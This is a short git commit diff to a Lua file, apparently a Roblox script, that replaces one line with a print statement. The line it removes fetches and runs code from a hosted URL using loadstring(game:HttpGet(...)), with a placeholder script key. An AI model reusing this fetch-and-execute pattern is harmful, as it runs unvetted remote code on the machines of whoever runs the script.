57463fc390a267ca29396e1c0ee662a6881c0e85
Kerfysik <142886114+denplanewalker@users.noreply.github.com>
2026-06-29 18:36:43 +0300

    Update DL.lua

--- DL.lua
+++ DL.lua
@@ -1,3 +1,1 @@
-script_key = "%KEY%"
-
-loadstring(game:HttpGet("https://api.getpolsec.com/scripts/hosted/217a2c35bc687a43b8c1b360b6ecb3c0be1dd2add680ca262866e8c6bc2d0c1e.lua"))()
+print("check ds server")
